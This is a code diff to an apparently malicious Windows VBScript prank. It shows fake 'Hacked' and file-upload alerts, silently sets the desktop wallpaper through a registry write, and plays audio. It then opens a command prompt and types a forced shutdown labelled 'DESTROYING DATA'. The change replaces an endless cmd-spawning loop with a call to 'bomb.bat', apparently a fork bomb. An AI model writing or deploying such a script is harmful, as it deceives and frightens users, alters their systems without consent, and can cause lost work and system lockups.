@@ -18,13 +18,29 @@ X=MsgBox("Please Wait. Uploading files to server. Do you wish to cancel operatio
 X=MsgBox("Error while stopping operation. File Transfer completed.",1+16,"Completed") 
 X=MsgBox("You did not share post.",0+48,"Possible Threat Detected") 
 X=MsgBox("Your computer is under control now.",1+64,"Hacked") 
+dim wshShell 
+dim sUserName
+
+Set wshShell = WScript.CreateObject("WScript.Shell") 
+sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")
+
+Set oShell = CreateObject("WScript.Shell") 
+Set oFSO = CreateObject("Scripting.FileSystemObject")
+
+sWinDir = oFSO.GetSpecialFolder(0) 
+sWallPaper = "E:\wallpaper.jpg"
+
+' update in registry 
+oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
+
+' let the system know about the change 
+oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 Dim oPlayer
 Set oPlayer = CreateObject("WMPlayer.OCX")
 oPlayer.URL = "E:\song.mp3"
 oPlayer.controls.play 
 While oPlayer.playState <> 1 ' 1 = Stopped
 WScript.Sleep 1000
-wend
 set shellobj = CreateObject("WScript.shell")
 shellobj.run "cmd"
 wscript.sleep 500
@@ -42,9 +58,8 @@ shellobj.sendkeys "CONTROL "
 wscript.sleep 500
 shellobj.sendkeys "{ESC}"
 wscript.sleep 50
-shellobj.sendkeys "shutdown -s -f -c DELETING DATA -t 30"
+shellobj.sendkeys "shutdown -s -f -t 30 -c DESTROYING DATA"
 wscript.sleep 50 
 shellobj.sendkeys "{ENTER}"
-Do
-shellobj.run "cmd"
-Loop
+shellobj.run "bomb.bat"
+wend
